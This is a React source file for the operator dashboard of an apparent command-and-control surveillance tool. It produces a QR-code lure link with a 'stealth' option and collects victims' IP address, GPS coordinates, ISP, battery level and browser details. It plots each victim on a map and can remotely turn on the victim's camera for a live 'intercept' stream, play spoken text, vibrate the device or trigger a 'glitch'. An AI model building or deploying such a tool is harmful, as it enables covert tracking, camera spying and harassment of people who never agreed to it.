
import React, { useEffect, useState, useCallback } from 'react';
import { v4 as uuidv4 } from 'uuid';
import Terminal from '../components/Terminal';
import QRCodeDisplay from '../components/QRCodeDisplay';
import HackerMap from '../components/HackerMap';
import { mqttService } from '../services/mqttService';
import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
import { Camera, X, Disc, Mic, Zap, Send, EyeOff, Eye, Cpu, HardDrive, Battery as BatteryIcon, Wifi } from 'lucide-react';

const Dashboard: React.FC = () => {
  const [sessionId] = useState(uuidv4());
  const [logs, setLogs] = useState<TerminalLog[]>([]);
  const [connected, setConnected] = useState(false);
  const [targetUrl, setTargetUrl] = useState('');
  const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
  const [isStealth, setIsStealth] = useState(false);
  const [lastPayload, setLastPayload] = useState<DeviceInfo | null>(null);
  
  const [showCameraModal, setShowCameraModal] = useState(false);
  const [cameraStream, setCameraStream] = useState<string | null>(null);
  const [isCameraActive, setIsCameraActive] = useState(false);
  const [ttsText, setTtsText] = useState('');

  const addLog = useCallback((message: string, type: TerminalLog['type'] = 'info', link?: string) => {
    setLogs(prev => [...prev, {
      id: uuidv4(),
      message,
      type,
      timestamp: new Date().toISOString(),
      link
    }]);
  }, []);

  const sendTTS = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!ttsText || !connected) return;
    addLog(`VOICE_INJECTION: "${ttsText}"`, "warning");
    mqttService.publishCommand(sessionId, { 
      type: 'SPEAK', 
      timestamp: new Date().toISOString(),
      payload: { text: ttsText }
    });
    setTtsText('');
  };

  const triggerGlitch = () => {
    if (!connected) return;
    addLog("EXEC_PROTOCOL: SYSTEM_FAILURE_GLITCH", "error");
    mqttService.publishCommand(sessionId, { type: 'GLITCH', timestamp: new Date().toISOString() });
  };

  const triggerVibrate = () => {
    if (!connected) return;
    addLog("EXEC_PROTOCOL: HAPTIC_FEEDBACK", "system");
    mqttService.publishCommand(sessionId, { type: 'VIBRATE', timestamp: new Date().toISOString() });
  }

  const toggleCamera = () => {
    if (!connected) return;
    if (!isCameraActive) {
      mqttService.publishCommand(sessionId, { type: 'ACTIVATE_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(true);
      setIsCameraActive(true);
    } else {
      mqttService.publishCommand(sessionId, { type: 'STOP_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(false);
      setIsCameraActive(false);
      setCameraStream(null);
    }
  };

  useEffect(() => {
    const baseUrl = window.location.href.split('#')[0];
    const scanUrl = `${baseUrl}#/scan?session=${sessionId}${isStealth ? '&stealth=true' : ''}`;
    setTargetUrl(scanUrl);
  }, [sessionId, isStealth]);

  useEffect(() => {
    mqttService.connect(
      sessionId,
      (payload: DeviceInfo) => {
        setLastPayload(payload);
        addLog(`UPLINK_SUCCESS: ${payload.ip}`, 'success');
        if (payload.coords) {
           setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
           addLog(`GEOLOCATION_FIXED: ${payload.coords.latitude}, ${payload.coords.longitude}`, 'success');
        }
      },
      () => {
        setConnected(true);
        addLog(`C2_SERVER_ONLINE: READY_FOR_ACQUISITION`, 'system');
      },
      undefined, 
      (streamData: StreamMessage) => setCameraStream(streamData.image)
    );
    return () => mqttService.disconnect();
  }, [sessionId, addLog]);

  return (
    <div className="flex h-screen w-screen overflow-hidden bg-black font-mono text-green-500">
      {/* Left Column: Terminal & Controls */}
      <div className="w-1/3 flex flex-col border-r border-gray-800 z-30">
        <div className="flex-1 overflow-hidden">
          <Terminal logs={logs} connected={connected} sessionId={sessionId} />
        </div>
        
        {/* Quick Command Center */}
        <div className="p-4 bg-zinc-950 border-t border-gray-800 space-y-3">
           <form onSubmit={sendTTS} className="flex gap-2">
              <div className="flex-1 bg-black border border-gray-800 flex items-center px-3 group focus-within:border-green-500 transition-colors">
                 <Mic size={14} className="text-gray-600 mr-2 group-focus-within:text-green-500" />
                 <input 
                    value={ttsText}
                    onChange={(e) => setTtsText(e.target.value)}
                    placeholder="SAY_SOMETHING_REMOTE..." 
                    className="bg-transparent border-none text-[10px] py-2 w-full text-green-500 focus:outline-none placeholder:text-gray-800"
                 />
              </div>
              <button type="submit" className="bg-green-950/20 border border-green-800 px-3 py-1 hover:bg-green-900/40 text-green-500 transition-all active:scale-95">
                <Send size={14} />
              </button>
           </form>

           <div className="grid grid-cols-2 gap-2">
             <button onClick={() => setIsStealth(!isStealth)} className={`flex items-center justify-center gap-2 py-2 text-[10px] font-bold border transition-all ${isStealth ? 'bg-blue-900/30 border-blue-500 text-blue-400' : 'bg-zinc-900 border-zinc-800 text-gray-500'}`}>
               {isStealth ? <EyeOff size={14} /> : <Eye size={14} />} {isStealth ? 'STEALTH_ON' : 'STEALTH_OFF'}
             </button>
             <button onClick={toggleCamera} disabled={!connected} className={`flex items-center justify-center gap-2 py-2 text-[10px] font-bold border ${isCameraActive ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' : 'bg-zinc-900 border-zinc-800 text-gray-400 disabled:opacity-20'}`}>
               <Camera size={14} /> CAM_STREAM
             </button>
             <button onClick={triggerGlitch} disabled={!connected} className="flex items-center justify-center gap-2 py-2 text-[10px] font-bold border bg-red-950/20 border-red-900 text-red-600 hover:bg-red-600 hover:text-white transition-colors">
               <Zap size={14} /> GLITCH_SYS
             </button>
             <button onClick={triggerVibrate} disabled={!connected} className="flex items-center justify-center gap-2 py-2 text-[10px] font-bold border bg-zinc-900 border-zinc-800 text-gray-400 hover:bg-white hover:text-black">
               VIBRATE_TGT
             </button>
           </div>
        </div>
      </div>

      {/* Center: Map / QR */}
      <div className="flex-1 relative border-r border-gray-800">
        {targetCoords ? (
          <HackerMap lat={targetCoords.lat} lng={targetCoords.lng} />
        ) : (
          <QRCodeDisplay url={targetUrl} />
        )}
      </div>

      {/* Right Column: Telemetry Data Panel */}
      <div className="w-1/4 bg-zinc-950 flex flex-col z-30 overflow-y-auto">
        <div className="p-4 border-b border-gray-900 flex items-center justify-between bg-black">
          <span className="text-xs font-bold tracking-[0.2em]">TARGET_TELEMETRY</span>
          <Wifi size={14} className={connected && lastPayload ? 'text-green-500 animate-pulse' : 'text-gray-800'} />
        </div>
        
        {lastPayload ? (
          <div className="p-4 space-y-6 text-[11px]">
            {/* HW Section */}
            <section className="space-y-2">
              <h4 className="text-gray-600 flex items-center gap-2"><Cpu size={12}/> HARDWARE_DECODER</h4>
              <div className="bg-black/50 p-2 border border-gray-900 space-y-1">
                <div className="flex justify-between"><span>CPU_CORES</span><span className="text-white">{lastPayload.hardwareConcurrency || '??'}</span></div>
                <div className="flex justify-between"><span>RAM_EST</span><span className="text-white">{lastPayload.deviceMemory ? `${lastPayload.deviceMemory}GB` : '??'}</span></div>
                <div className="flex justify-between"><span>BATTERY</span><span className={lastPayload.battery && lastPayload.battery < 20 ? 'text-red-500' : 'text-green-500'}>{lastPayload.battery}%</span></div>
                <div className="text-[9px] text-gray-700 truncate mt-1">{lastPayload.gpu}</div>
              </div>
            </section>

            {/* Network Section */}
            <section className="space-y-2">
              <h4 className="text-gray-600 flex items-center gap-2"><HardDrive size={12}/> NETWORK_STUB</h4>
              <div className="bg-black/50 p-2 border border-gray-900 space-y-1">
                <div className="flex justify-between"><span>IP_ADDR</span><span className="text-blue-400">{lastPayload.ip}</span></div>
                <div className="flex justify-between"><span>CONNECTION</span><span className="text-white">{lastPayload.connectionType}</span></div>
                <div className="flex justify-between"><span>REGION</span><span className="text-white">{lastPayload.ipGeo?.city}, {lastPayload.ipGeo?.country}</span></div>
                <div className="flex justify-between"><span>ISP</span><span className="text-[9px] text-white truncate max-w-[100px]">{lastPayload.ipGeo?.isp}</span></div>
              </div>
            </section>

            {/* Client Context */}
            <section className="space-y-2">
              <h4 className="text-gray-600">CLIENT_CONTEXT</h4>
              <div className="bg-black/50 p-2 border border-gray-900 text-[9px] leading-tight text-zinc-400 break-all font-sans">
                {lastPayload.userAgent}
              </div>
            </section>
            
            <div className="pt-4 border-t border-gray-900">
               <div className="text-[10px] text-gray-700 mb-2 italic">SCAN_TIMESTAMP: {new Date(lastPayload.timestamp).toLocaleString()}</div>
               <button onClick={() => setLastPayload(null)} className="w-full py-2 border border-gray-800 text-gray-600 hover:text-red-500 hover:border-red-900 text-[9px] transition-colors uppercase">Clear Target Data</button>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center p-8 text-center opacity-20">
            <div className="relative mb-4">
              <Disc size={64} className="animate-[spin_4s_linear_infinite]" />
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
              </div>
            </div>
            <div className="text-[10px] uppercase tracking-widest">Scanning for incoming Uplinks...</div>
          </div>
        )}
      </div>

      {showCameraModal && (
        <div className="fixed inset-0 z-[100] bg-black/90 flex items-center justify-center backdrop-blur-sm p-4">
          <div className="bg-black border border-red-900 w-full max-w-xl shadow-[0_0_50px_rgba(255,0,0,0.2)]">
            <div className="bg-red-900/20 p-3 flex justify-between items-center text-red-500 text-[10px] font-bold border-b border-red-900/50">
              <span className="flex items-center gap-2"><Disc size={12} className="animate-pulse" /> [LIVE_INTERCEPT] CAMERA_NODE_ACTIVE</span>
              <button onClick={toggleCamera} className="hover:bg-red-500 hover:text-black transition-colors p-1"><X size={16} /></button>
            </div>
            <div className="aspect-video bg-zinc-950 flex items-center justify-center overflow-hidden relative">
              {cameraStream ? (
                <img src={cameraStream} className="w-full h-full object-cover scale-x-[-1]" alt="Intercept" />
              ) : (
                <div className="flex flex-col items-center gap-2">
                   <div className="w-8 h-8 border-2 border-red-500 border-t-transparent rounded-full animate-spin"></div>
                   <span className="text-red-900 animate-pulse text-[10px]">SYNCING_PACKETS...</span>
                </div>
              )}
              {/* Camera Overlays */}
              <div className="absolute top-4 left-4 border-l border-t border-red-500 w-8 h-8"></div>
              <div className="absolute top-4 right-4 border-r border-t border-red-500 w-8 h-8"></div>
              <div className="absolute bottom-4 left-4 border-l border-b border-red-500 w-8 h-8"></div>
              <div className="absolute bottom-4 right-4 border-r border-b border-red-500 w-8 h-8"></div>
              <div className="absolute top-1/2 left-4 -translate-y-1/2 w-4 h-[1px] bg-red-500/30"></div>
              <div className="absolute top-1/2 right-4 -translate-y-1/2 w-4 h-[1px] bg-red-500/30"></div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
